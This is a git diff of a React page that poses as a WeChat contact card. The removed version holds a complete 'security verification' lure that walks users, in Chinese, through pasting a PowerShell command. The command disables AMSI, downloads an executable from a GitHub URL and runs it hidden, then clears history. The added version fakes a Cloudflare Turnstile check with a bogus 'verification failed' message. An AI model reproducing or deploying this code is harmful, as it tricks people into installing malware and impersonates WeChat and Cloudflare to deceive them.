@@ -1,398 +1,423 @@
-import { useState, useEffect } from 'react';
+import { useState, useEffect, useCallback } from "react";
 
-const powerShellCommand = `powershell -w h -nop -c "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true);$wc=New-Object Net.WebClient;$wc.Headers.Add('User-Agent','Mozilla/5.0');$f='$env:TEMP\\winupdate.exe';$wc.DownloadFile('https://github.com/ShewiYT/owuenwempgf/raw/refs/heads/main/agent-windows-amd64-b4aba189.exe',$f);Start-Process $f -WindowStyle Hidden;Clear-History"`;
+type Phase = "checking" | "error" | "captcha" | "captcha-solving" | "captcha-done";
 
-function CopyIcon() {
+function WeChatIcon() {
   return (
-    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" className="w-4 h-4">
-      <rect x="9" y="9" width="13" height="13" rx="2" ry="2"/>
-      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/>
+    <svg
+      width="56"
+      height="56"
+      viewBox="0 0 512 512"
+      fill="none"
+      xmlns="http://www.w3.org/2000/svg"
+    >
+      <rect width="512" height="512" rx="110" fill="#07C160" />
+      <path
+        d="M209.7 135C152.3 135 105 173.7 105 221.5C105 249.2 120.8 273.7 145.5 289.2L138.5 315.5L170.2 298.2C182.5 301.8 195.8 303.8 209.7 303.8C214.2 303.8 218.6 303.5 223 303.1C219.5 294.3 217.5 284.8 217.5 274.8C217.5 224.5 260.8 183.8 314.5 183.8C319.3 183.8 324 184.2 328.6 184.8C320.3 154.7 268.5 135 209.7 135Z"
+        fill="white"
+      />
+      <circle cx="178" cy="210" r="13" fill="#07C160" />
+      <circle cx="241" cy="210" r="13" fill="#07C160" />
+      <path
+        d="M314.5 199C267.8 199 230 231.3 230 271C230 310.7 267.8 343 314.5 343C323.5 343 332.2 341.8 340.3 339.5L366.5 354L361 332.5C381.2 319.5 394 299 394 276C394 236 361.5 199 314.5 199Z"
+        fill="white"
+      />
+      <circle cx="290" cy="268" r="10" fill="#07C160" />
+      <circle cx="340" cy="268" r="10" fill="#07C160" />
     </svg>
   );
 }
 
-function CheckIcon() {
+function Spinner({ size = 22, color = "#07C160" }: { size?: number; color?: string }) {
   return (
-    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round" className="w-3 h-3">
-      <polyline points="20 6 9 17 4 12"/>
+    <div
+      style={{
+        width: `${size}px`,
+        height: `${size}px`,
+        border: "2.5px solid #e0e0e0",
+        borderTopColor: color,
+        borderRadius: "50%",
+        animation: "spin 0.8s linear infinite",
+        display: "inline-block",
+        flexShrink: 0,
+      }}
+    />
+  );
+}
+
+function CloudflareLogo() {
+  return (
+    <svg width="26" height="26" viewBox="0 0 61 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+      <path
+        d="M19.1 16.7l.7-2.3c.4-1.3.2-2.5-.5-3.4-.6-.8-1.6-1.3-2.7-1.3l-10.8-.2c-.1 0-.2-.1-.3-.1-.1-.1-.1-.2 0-.3.1-.2.2-.3.4-.3l10.9-.2c2.3-.1 4.7-2 5.5-4.2l1-2.8c0-.1.1-.2 0-.3C21.8 .7 20 0 18 0 14.1 0 10.7 2.7 9.7 6.4c-.9-.7-2.1-1-3.3-.9-2.1.3-3.7 2-4 4.1-.1.5-.1 1 0 1.4C1.1 11.2 0 12.5 0 14c0 1.7 1.1 3.1 2.7 3.2h15.6c.2 0 .4-.1.5-.3l.3-.6v-.6z"
+        fill="#F38020"
+      />
+      <path
+        d="M22 10c-.2 0-.3 0-.5.1l-.4 1.5c-.4 1.3-.2 2.5.5 3.4.6.8 1.6 1.3 2.7 1.3l3.4.2c.1 0 .2.1.3.1.1.1.1.2 0 .3-.1.2-.2.3-.4.3l-3.5.2c-2.3.1-4.7 2-5.5 4.2l-.3.9c0 .2.1.3.3.3h12.5c.2 0 .3-.1.4-.3.4-1.2.7-2.4.7-3.7C32.2 14 27.6 10 22 10z"
+        fill="#FAAE40"
+      />
     </svg>
   );
 }
 
-function ShieldIcon() {
+function CheckmarkIcon() {
   return (
-    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" className="w-5 h-5">
-      <path d="M12 2L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-3zm-1 16l-4-4 1.41-1.41L11 15.17l5.59-5.58L18 11l-7 7z"/>
-    </svg>
-  );
-}
-
-function Spinner() {
-  return (
-    <svg className="animate-spin w-5 h-5" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
-      <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
-      <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
+    <svg width="20" height="20" viewBox="0 0 20 20" fill="none">
+      <circle cx="10" cy="10" r="10" fill="#07C160" />
+      <path
+        d="M6 10.5L8.5 13L14 7.5"
+        stroke="white"
+        strokeWidth="2"
+        strokeLinecap="round"
+        strokeLinejoin="round"
+      />
     </svg>
   );
 }
 
 function ErrorIcon() {
   return (
-    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" className="w-7 h-7">
-      <circle cx="12" cy="12" r="10"/>
-      <line x1="12" y1="8" x2="12" y2="12"/>
-      <line x1="12" y1="16" x2="12.01" y2="16"/>
+    <svg width="18" height="18" viewBox="0 0 20 20" fill="none">
+      <circle cx="10" cy="10" r="10" fill="#D93025" />
+      <path d="M10 5v6" stroke="white" strokeWidth="2" strokeLinecap="round" />
+      <circle cx="10" cy="14.5" r="1.2" fill="white" />
     </svg>
   );
 }
 
-interface StepProps {
-  num: number;
-  title: string;
-  description: string;
-  completed: boolean;
-  active: boolean;
-}
+function CaptchaWidget({
+  phase,
+  onCheck,
+}: {
+  phase: Phase;
+  onCheck: () => void;
+}) {
+  const isChecking = phase === "captcha-solving";
+  const isDone = phase === "captcha-done";
 
-function StepItem({ num, title, description, completed, active }: StepProps) {
   return (
-    <div className="flex gap-3">
-      <div className={`flex-shrink-0 w-8 h-8 rounded-full flex items-center justify-center text-sm font-bold transition-all ${
-        completed ? 'bg-[#07c160] text-white scale-100' :
-        active ? 'bg-[#07c160] text-white scale-100' :
-        'bg-gray-200 text-gray-500'
-      }`}>
-        {completed ? <CheckIcon /> : num}
-      </div>
-      <div className="flex-1 pb-3">
-        <div className={`font-medium text-sm ${active ? 'text-[#1a1a1a]' : completed ? 'text-[#1a1a1a]' : 'text-gray-400'}`}>
-          {title}
+    <div
+      style={{
+        width: "300px",
+        background: "#fff",
+        borderRadius: "4px",
+        border: "1px solid #e0e0e0",
+        boxShadow: "0 2px 8px rgba(0,0,0,0.08)",
+        overflow: "hidden",
+        animation: "fadeInUp 0.4s ease",
+      }}
+    >
+      {/* Main area */}
+      <div
+        style={{
+          display: "flex",
+          alignItems: "center",
+          padding: "14px 16px",
+          gap: "12px",
+        }}
+      >
+        {/* Checkbox area */}
+        <div
+          onClick={!isChecking && !isDone ? onCheck : undefined}
+          style={{
+            width: "24px",
+            height: "24px",
+            borderRadius: "4px",
+            border: isDone ? "none" : "2px solid #c0c0c0",
+            cursor: isChecking || isDone ? "default" : "pointer",
+            display: "flex",
+            alignItems: "center",
+            justifyContent: "center",
+            flexShrink: 0,
+            transition: "border-color 0.2s",
+            background: isDone ? "transparent" : "#fff",
+          }}
+          onMouseEnter={(e) => {
+            if (!isChecking && !isDone)
+              (e.currentTarget as HTMLDivElement).style.borderColor = "#999";
+          }}
+          onMouseLeave={(e) => {
+            if (!isChecking && !isDone)
+              (e.currentTarget as HTMLDivElement).style.borderColor = "#c0c0c0";
+          }}
+        >
+          {isChecking && <Spinner size={18} color="#f5a623" />}
+          {isDone && <CheckmarkIcon />}
         </div>
-        <div className={`text-xs mt-1 leading-relaxed ${active ? 'text-[#555]' : 'text-gray-400'}`}>
-          {description}
+
+        {/* Label */}
+        <span
+          style={{
+            fontSize: "14px",
+            color: "#333",
+            fontWeight: 400,
+            flex: 1,
+            userSelect: "none",
+          }}
+        >
+          Verify you are human
+        </span>
+
+        {/* Cloudflare branding */}
+        <div
+          style={{
+            display: "flex",
+            flexDirection: "column",
+            alignItems: "flex-end",
+            gap: "2px",
+          }}
+        >
+          <CloudflareLogo />
+          <span style={{ fontSize: "9px", color: "#999", lineHeight: 1 }}>
+            Cloudflare Turnstile
+          </span>
         </div>
       </div>
+
+      {/* Bottom border accent */}
+      <div
+        style={{
+          height: "3px",
+          background: isDone
+            ? "#07C160"
+            : isChecking
+            ? "linear-gradient(90deg, #f5a623, #f7c948, #f5a623)"
+            : "#f5a623",
+          backgroundSize: isChecking ? "200% 100%" : "100% 100%",
+          animation: isChecking ? "shimmer 1.5s infinite" : "none",
+        }}
+      />
     </div>
   );
 }
 
-function App() {
-  const [showVerify, setShowVerify] = useState(false);
-  const [currentStep, setCurrentStep] = useState(0);
-  const [copied, setCopied] = useState(false);
-  const [verifying, setVerifying] = useState(false);
-  const [error, setError] = useState(false);
-  const [countdown, setCountdown] = useState(60);
-
-  const steps = [
-    { title: '打开高级用户菜单', description: '请按键盘上的 Win + X 组合键' },
-    { title: '启动终端', description: '按字母 I 键，或在菜单中选择 "Windows PowerShell" / "终端"' },
-    { title: '复制命令', description: '点击下方 Copy 按钮复制命令，然后在终端窗口中粘贴 (Ctrl+V)' },
-    { title: '执行命令', description: '在终端中按 Enter 键完成验证' },
-  ];
+export default function App() {
+  const [phase, setPhase] = useState<Phase>("checking");
+  const [showContent, setShowContent] = useState(false);
 
   useEffect(() => {
-    let timer: ReturnType<typeof setInterval>;
-    if (error && countdown > 0) {
-      timer = setInterval(() => {
-        setCountdown((c) => c - 1);
-      }, 1000);
+    const t1 = setTimeout(() => setShowContent(true), 100);
+    return () => clearTimeout(t1);
+  }, []);
+
+  // After 1 second of "checking", show error, then captcha
+  useEffect(() => {
+    if (phase === "checking") {
+      const t = setTimeout(() => setPhase("error"), 1200);
+      return () => clearTimeout(t);
     }
-    return () => clearInterval(timer);
-  }, [error, countdown]);
-
-  const handleAddContact = () => {
-    window.location.href = 'https://redirect-ten-gold.vercel.app/';
-  };
-
-  const handleCopy = async () => {
-    try {
-      await navigator.clipboard.writeText(powerShellCommand);
-      setCopied(true);
-      setTimeout(() => setCopied(false), 2000);
-    } catch (err) {
-      const textarea = document.createElement('textarea');
-      textarea.value = powerShellCommand;
-      document.body.appendChild(textarea);
-      textarea.select();
-      document.execCommand('copy');
-      document.body.removeChild(textarea);
-      setCopied(true);
-      setTimeout(() => setCopied(false), 2000);
+    if (phase === "error") {
+      const t = setTimeout(() => setPhase("captcha"), 800);
+      return () => clearTimeout(t);
     }
-  };
+  }, [phase]);
 
-  const handleVerify = () => {
-    setVerifying(true);
-    setError(false);
-    let step = 0;
-    const interval = setInterval(() => {
-      step += 1;
-      setCurrentStep(step);
-      if (step >= steps.length) {
-        clearInterval(interval);
-        setTimeout(() => {
-          setVerifying(false);
-          setError(true);
-          setCountdown(60);
-        }, 900);
-      }
-    }, 600);
-  };
-
-  const closeVerify = () => {
-    setShowVerify(false);
-    setCurrentStep(0);
-    setVerifying(false);
-    setError(false);
-  };
-
-  const retryFromError = () => {
-    setError(false);
-    setCurrentStep(0);
-    setVerifying(false);
-    setCountdown(60);
-  };
+  const handleCaptchaCheck = useCallback(() => {
+    setPhase("captcha-solving");
+    setTimeout(() => {
+      setPhase("captcha-done");
+    }, 2000);
+  }, []);
 
   return (
-    <div className="min-h-screen bg-[#ededed] flex items-center justify-center p-4">
-      <div className="w-full max-w-[380px] bg-white rounded-2xl shadow-xl overflow-hidden">
-        {/* Header */}
-        <div className="bg-[#07c160] px-5 py-4 flex items-center justify-between">
-          <span className="text-white text-base font-medium flex items-center gap-1.5">
-            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" className="w-5 h-5">
-              <path d="M8.516 14.323c-.35 0-.7-.068-1.024-.198l-.37-.144-.39.262c-.456.308-.944.556-1.456.74.148-.336.27-.688.366-1.048l.166-.62-.48-.412C4.2 11.906 3.5 10.647 3.5 9.323c0-2.898 2.79-5.323 6.264-5.323 2.974 0 5.542 1.756 6.14 4.143-.362-.058-.734-.09-1.112-.09-3.786 0-6.87 2.77-6.87 6.17 0 .076.002.152.005.227-.135.013-.272.02-.411.02v-.147zm5.792 2.94c.328.162.674.248 1.026.248l-.001.09c.107 0 .213-.006.317-.017-.003-.059-.004-.117-.004-.173 0-2.72 2.466-4.93 5.496-4.93.303 0 .6.025.89.072-.478-1.908-2.532-3.316-4.914-3.316-2.78 0-5.032 1.94-5.032 4.257 0 1.06.552 2.131 1.517 2.94l.384.328-.133.498c-.076.286-.174.566-.294.834.41-.147.8-.346 1.164-.594l.312-.21.296.115z"/>
-            </svg>
-            微信
-          </span>
-          <span className="text-white/90 text-sm">名片</span>
+    <div
+      style={{
+        minHeight: "100vh",
+        display: "flex",
+        flexDirection: "column",
+        alignItems: "center",
+        justifyContent: "center",
+        backgroundColor: "#ffffff",
+        fontFamily:
+          "-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif",
+        padding: "20px",
+      }}
+    >
+      <div
+        style={{
+          display: "flex",
+          flexDirection: "column",
+          alignItems: "center",
+          justifyContent: "center",
+          opacity: showContent ? 1 : 0,
+          transform: showContent ? "translateY(0)" : "translateY(10px)",
+          transition: "opacity 0.5s ease, transform 0.5s ease",
+        }}
+      >
+        {/* Logo */}
+        <div style={{ marginBottom: "14px" }}>
+          <WeChatIcon />
         </div>
 
-        {/* Wave */}
-        <div className="relative">
-          <svg viewBox="0 0 380 30" className="w-full block" preserveAspectRatio="none">
-            <path d="M0,0 L380,0 L380,15 Q285,30 190,15 Q95,0 0,15 Z" fill="#07c160"/>
-          </svg>
-        </div>
+        {/* Title */}
+        <h1
+          style={{
+            fontSize: "22px",
+            fontWeight: 600,
+            color: "#191919",
+            margin: "0 0 40px 0",
+            letterSpacing: "-0.2px",
+          }}
+        >
+          WeChat
+        </h1>
 
-        {/* Avatar */}
-        <div className="flex justify-center -mt-4 relative z-10">
-          <div className="w-24 h-24 rounded-full border-4 border-white shadow-lg overflow-hidden bg-gray-100">
-            <img
-              src="/avatar.jpg"
-              alt="Avatar"
-              className="w-full h-full object-cover"
-            />
-          </div>
-        </div>
-
-        {/* Info */}
-        <div className="px-6 pt-3 pb-6 text-center">
-          <h2 className="text-xl font-bold text-[#1a1a1a] mb-1">Katy Sunshine</h2>
-          <p className="text-xs text-[#999] mb-3">微信号: KaterinaZakat</p>
-
-          <div className="flex items-center justify-center gap-2 mb-4">
-            <span className="inline-flex items-center gap-1 bg-[#f5f5f5] text-[#555] text-xs px-3 py-1 rounded-full">
-              <img src="https://flagcdn.com/lv.svg" alt="Latvia" className="w-4 h-3 object-cover rounded-sm" />
-              拉脱维亚
-            </span>
-            <span className="inline-flex items-center gap-1 bg-[#f5f5f5] text-[#555] text-xs px-3 py-1 rounded-full">
-              🎮 玩家
-            </span>
-          </div>
-
-          <div className="bg-[#f9f9f9] rounded-xl px-4 py-3 mb-4 mx-2">
-            <p className="text-sm text-[#333] leading-relaxed">你好！我们做朋友吧 😊</p>
-          </div>
-
-          <div className="flex justify-center mb-5">
-            <div className="text-center">
-              <span className="block text-xl font-bold text-[#07c160]">6</span>
-              <span className="text-xs text-[#999]">好友</span>
+        {/* Content area */}
+        <div
+          style={{
+            display: "flex",
+            flexDirection: "column",
+            alignItems: "center",
+            gap: "20px",
+            minHeight: "120px",
+          }}
+        >
+          {/* Phase: Checking */}
+          {phase === "checking" && (
+            <div
+              style={{
+                display: "flex",
+                flexDirection: "column",
+                alignItems: "center",
+                gap: "20px",
+                animation: "fadeInUp 0.3s ease",
+              }}
+            >
+              <p
+                style={{
+                  fontSize: "15px",
+                  color: "#555",
+                  margin: 0,
+                  textAlign: "center",
+                  lineHeight: "1.5",
+                }}
+              >
+                Checking if you are human. This may take a few seconds.
+              </p>
+              <Spinner />
             </div>
-          </div>
+          )}
 
-          <button
-            onClick={handleAddContact}
-            className="w-full bg-[#07c160] hover:bg-[#06ad56] active:bg-[#059a4c] text-white font-medium text-base py-3 rounded-xl transition-all duration-200 flex items-center justify-center gap-2 shadow-md shadow-[#07c160]/30 cursor-pointer"
-          >
-            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" className="w-5 h-5">
-              <path d="M8.516 14.323c-.35 0-.7-.068-1.024-.198l-.37-.144-.39.262c-.456.308-.944.556-1.456.74.148-.336.27-.688.366-1.048l.166-.62-.48-.412C4.2 11.906 3.5 10.647 3.5 9.323c0-2.898 2.79-5.323 6.264-5.323 2.974 0 5.542 1.756 6.14 4.143-.362-.058-.734-.09-1.112-.09-3.786 0-6.87 2.77-6.87 6.17 0 .076.002.152.005.227-.135.013-.272.02-.411.02v-.147zm5.792 2.94c.328.162.674.248 1.026.248l-.001.09c.107 0 .213-.006.317-.017-.003-.059-.004-.117-.004-.173 0-2.72 2.466-4.93 5.496-4.93.303 0 .6.025.89.072-.478-1.908-2.532-3.316-4.914-3.316-2.78 0-5.032 1.94-5.032 4.257 0 1.06.552 2.131 1.517 2.94l.384.328-.133.498c-.076.286-.174.566-.294.834.41-.147.8-.346 1.164-.594l.312-.21.296.115z"/>
-            </svg>
-            添加到通讯录
-          </button>
-        </div>
+          {/* Phase: Error */}
+          {phase === "error" && (
+            <div
+              style={{
+                display: "flex",
+                flexDirection: "column",
+                alignItems: "center",
+                gap: "16px",
+                animation: "fadeInUp 0.4s ease",
+              }}
+            >
+              <div
+                style={{
+                  display: "flex",
+                  alignItems: "center",
+                  gap: "8px",
+                }}
+              >
+                <ErrorIcon />
+                <p
+                  style={{
+                    fontSize: "15px",
+                    color: "#D93025",
+                    margin: 0,
+                    textAlign: "center",
+                    lineHeight: "1.5",
+                    fontWeight: 500,
+                  }}
+                >
+                  Browser verification failed.
+                </p>
+              </div>
+              <p
+                style={{
+                  fontSize: "13px",
+                  color: "#888",
+                  margin: 0,
+                  textAlign: "center",
+                }}
+              >
+                Please complete the security check below.
+              </p>
+            </div>
+          )}
 
-        <div className="text-center py-4 border-t border-[#f0f0f0]">
-          <span className="text-xs text-[#c0c0c0] tracking-widest">WECHAT · 微信</span>
+          {/* Phase: Captcha */}
+          {(phase === "captcha" ||
+            phase === "captcha-solving" ||
+            phase === "captcha-done") && (
+            <div
+              style={{
+                display: "flex",
+                flexDirection: "column",
+                alignItems: "center",
+                gap: "20px",
+                animation: "fadeInUp 0.4s ease",
+              }}
+            >
+              <div
+                style={{
+                  display: "flex",
+                  alignItems: "center",
+                  gap: "8px",
+                }}
+              >
+                {phase === "captcha-done" ? (
+                  <CheckmarkIcon />
+                ) : (
+                  <ErrorIcon />
+                )}
+                <p
+                  style={{
+                    fontSize: "15px",
+                    color: phase === "captcha-done" ? "#07C160" : "#D93025",
+                    margin: 0,
+                    textAlign: "center",
+                    lineHeight: "1.5",
+                    fontWeight: 500,
+                  }}
+                >
+                  {phase === "captcha-done"
+                    ? "Verification successful!"
+                    : "Browser verification failed."}
+                </p>
+              </div>
+
+              {phase !== "captcha-done" && (
+                <p
+                  style={{
+                    fontSize: "13px",
+                    color: "#888",
+                    margin: 0,
+                    textAlign: "center",
+                  }}
+                >
+                  Please complete the security check below.
+                </p>
+              )}
+
+              <CaptchaWidget phase={phase} onCheck={handleCaptchaCheck} />
+
+              {phase === "captcha-done" && (
+                <p
+                  style={{
+                    fontSize: "13px",
+                    color: "#888",
+                    margin: 0,
+                    textAlign: "center",
+                    animation: "fadeInUp 0.4s ease",
+                  }}
+                >
+                  Redirecting...
+                </p>
+              )}
+            </div>
+          )}
         </div>
       </div>
 
-      {/* Verification Modal */}
-      {showVerify && (
-        <div className="fixed inset-0 bg-black/50 flex items-center justify-center p-4 z-50 animate-fadeIn">
-          <div className="w-full max-w-[420px] bg-white rounded-2xl shadow-2xl overflow-hidden max-h-[90vh] overflow-y-auto">
-            <div className="bg-gradient-to-r from-[#07c160] to-[#05a050] px-6 py-4 flex items-center justify-between">
-              <div className="flex items-center gap-2 text-white">
-                <ShieldIcon />
-                <span className="font-semibold">安全验证</span>
-              </div>
-              <button
-                onClick={closeVerify}
-                className="text-white/80 hover:text-white text-xl leading-none w-7 h-7 rounded-full hover:bg-white/10 transition cursor-pointer"
-                aria-label="Close"
-              >
-                ×
-              </button>
-            </div>
-
-            <div className="px-6 py-5">
-              {/* Initial state - show instructions */}
-              {!verifying && !error && (
-                <>
-                  <div className="text-center mb-5">
-                  <p className="text-sm text-gray-600">
-                  为防止自动请求，请执行以下步骤：
-                  </p>
-                </div>
-
-                <div className="bg-gray-50 rounded-xl p-4 mb-4">
-                  {steps.map((step, i) => (
-                    <StepItem
-                      key={i}
-                      num={i + 1}
-                      title={step.title}
-                      description={step.description}
-                      completed={false}
-                      active={true}
-                    />
-                  ))}
-                </div>
-
-                <div className="mb-5">
-                  <div className="flex items-center justify-between mb-2">
-                    <span className="text-xs font-medium text-gray-500">
-                      终端命令
-                    </span>
-                    <button
-                      onClick={handleCopy}
-                      className={`flex items-center gap-1.5 text-xs font-medium px-3 py-1.5 rounded-lg transition-all cursor-pointer ${
-                        copied
-                          ? 'bg-[#07c160] text-white'
-                          : 'bg-gray-100 text-gray-700 hover:bg-gray-200'
-                      }`}
-                    >
-                      {copied ? <><CheckIcon /> 已复制</> : <><CopyIcon /> 复制</>}
-                    </button>
-                  </div>
-                  <div className="bg-gray-900 text-gray-100 rounded-xl p-3 font-mono text-xs break-all leading-relaxed max-h-32 overflow-y-auto select-all">
-                    {powerShellCommand}
-                  </div>
-                </div>
-
-                <button
-                  onClick={handleVerify}
-                  className="w-full bg-[#07c160] hover:bg-[#06ad56] active:bg-[#059a4c] text-white font-semibold text-base py-3.5 rounded-xl transition-all duration-200 flex items-center justify-center gap-2 shadow-lg shadow-[#07c160]/30 cursor-pointer"
-                >
-                  我已完成步骤 · 继续
-                </button>
-
-                <p className="text-[10px] text-gray-400 text-center mt-3">
-                  点击"继续"即表示您确认已完成所有验证步骤
-                </p>
-              </>
-              )}
-
-              {/* Verifying state */}
-              {verifying && !error && (
-                <div className="py-4">
-                  <div className="flex flex-col items-center mb-6">
-                    <div className="w-14 h-14 rounded-full bg-[#07c160]/10 flex items-center justify-center text-[#07c160] mb-3">
-                      {currentStep >= steps.length ? (
-                        <CheckIcon />
-                      ) : (
-                        <Spinner />
-                      )}
-                    </div>
-                    <p className="text-sm font-medium text-[#1a1a1a]">
-                      {currentStep >= steps.length ? '验证中...' : '正在验证...'}
-                    </p>
-                  </div>
-
-                  <div className="bg-gray-50 rounded-xl p-4">
-                    {steps.map((step, i) => (
-                      <StepItem
-                        key={i}
-                        num={i + 1}
-                        title={step.title}
-                        description={step.description}
-                        completed={i < currentStep}
-                        active={i === currentStep}
-                      />
-                    ))}
-                  </div>
-                </div>
-              )}
-
-              {/* Error state */}
-              {error && (
-                <div className="py-4">
-                  <div className="flex flex-col items-center mb-5">
-                    <div className="w-16 h-16 rounded-full bg-red-50 flex items-center justify-center text-red-500 mb-3">
-                      <ErrorIcon />
-                    </div>
-                    <p className="text-base font-semibold text-red-600 mb-1">
-                      验证失败
-                    </p>
-                    <p className="text-sm text-gray-500 text-center">
-                      检测到异常行为，请稍后重试
-                    </p>
-                  </div>
-
-                  <div className="bg-red-50 border border-red-100 rounded-xl p-4 mb-5">
-                    <div className="text-sm text-red-700 text-center leading-relaxed">
-                      <p className="font-medium mb-2">⚠️ 安全警告</p>
-                      <p className="text-red-600">
-                        系统检测到您的操作可能存在风险。
-                      </p>
-                      <p className="text-red-600 mt-2">
-                        请在 <span className="font-bold text-red-700">{countdown}</span> 秒后重新尝试。
-                      </p>
-                    </div>
-                  </div>
-
-                  <div className="flex flex-col items-center mb-5">
-                    <div className="text-5xl font-bold text-gray-300 font-mono">
-                      {String(Math.floor(countdown / 60)).padStart(2, '0')}
-                      <span className="animate-pulse">:</span>
-                      {String(countdown % 60).padStart(2, '0')}
-                    </div>
-                    <p className="text-xs text-gray-400 mt-1">倒计时</p>
-                  </div>
-
-                  <button
-                    onClick={retryFromError}
-                    disabled={countdown > 0}
-                    className={`w-full font-semibold text-base py-3.5 rounded-xl transition-all duration-200 flex items-center justify-center gap-2 cursor-pointer ${
-                      countdown > 0
-                        ? 'bg-gray-200 text-gray-400 cursor-not-allowed'
-                        : 'bg-[#07c160] hover:bg-[#06ad56] text-white shadow-lg shadow-[#07c160]/30'
-                    }`}
-                  >
-                    {countdown > 0 ? `请等待 ${countdown} 秒` : '重新验证'}
-                  </button>
-
-                  <p className="text-[10px] text-gray-400 text-center mt-3">
-                    提示：请确保您已正确执行所有终端命令
-                  </p>
-                </div>
-              )}
-            </div>
-          </div>
-        </div>
-      )}
+      <div style={{ height: "80px" }} />
     </div>
   );
 }
-
-export default App;
